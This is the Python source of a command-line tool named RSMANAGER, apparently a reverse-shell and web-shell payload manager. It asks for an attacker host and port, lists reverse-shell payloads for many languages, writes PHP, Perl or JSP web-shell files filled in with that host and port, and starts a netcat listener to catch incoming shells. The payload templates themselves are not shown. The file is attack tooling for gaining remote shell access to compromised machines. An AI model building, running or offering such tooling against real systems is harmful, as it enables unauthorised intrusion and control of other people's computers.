#!/usr/bin/python3
import os
import usr_input

try:
    os.system("figlet test")
    os.system("clear")
except:
    os.system("apt-get install figlet")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



    
def banner():
    os.system("clear")
    print(bcolors.BOLD+bcolors.HEADER)
    os.system("figlet RSMANAGER")
    print("----------"*6)
    print("Github: Bedoff & saygunhan                     Version 1.0.1\n")

def help():
    print('''
menu = Prints out the available payloads
get = Selects the payload and copies it to your desktop (usage: get 24)
clear = Clear the Terminal
help = Displays this menu
listen & nc = Executes "nc -lvp <LPORT>" (usage: listen )
    ''')
def menu():
    print(bcolors.ENDC+bcolors.BOLD+bcolors.HEADER)
    print('''
Msfvenom               ReverseShell                 WebShell
--------               ------------                 --------
1:Win Rev TCP          4:Awk                        24:PHP
2:Linux Rev TCP        5:Bash TCP                   25:PL
3:Other                6:Bash UDP                   26:JSP
                       7:C
                       8:Dart
                       9:Golang
                       10:Groovy
                       11:Java
                       12:Lua
                       13:Ncat
                       14:NodeJS
                       15:OpenSSL
                       16:Perl
                       17:PHP
                       18:Powershell
                       19:Python
                       20:Ruby
                       21:Socat
                       22:Telnet
                       23:War


    ''')                

def choose():
    print(bcolors.ENDC)
    x=input(bcolors.OKCYAN+"RSMANAGER > "+bcolors.ENDC)
    os.system("clear")
    banner()
    return x

def netcat():
    os.system("nc -lvp {}".format(lport))


banner()

lhost=input("LHOST: ")
lport=input("LPORT: ")
os.system("clear")

banner()

while True:
  x=choose()
  if x=="menu"or x=="MENU":
      menu()
  elif x=="help" or x=="HELP":
      help()
  
  
  elif x=="get 24":
      usr_input.replacematik("webshell","php-reverse-shell.php",lhost,lport)
      banner()
  elif x=="get 25":
      usr_input.replacematik("webshell","perl-reverse-shell.pl",lhost,lport)
      banner()
  elif x=="get 26":
      usr_input.replacematik("webshell","jsp-reverse.jsp",lhost,lport)
      banner()
  elif x=="listen" or x=="nc":
      netcat()


  elif x=="clear":
      os.system("clear")
  elif x=="exit":
      break
  else:
      print(bcolors.FAIL+"Something went wrong you can use help"+bcolors.ENDC)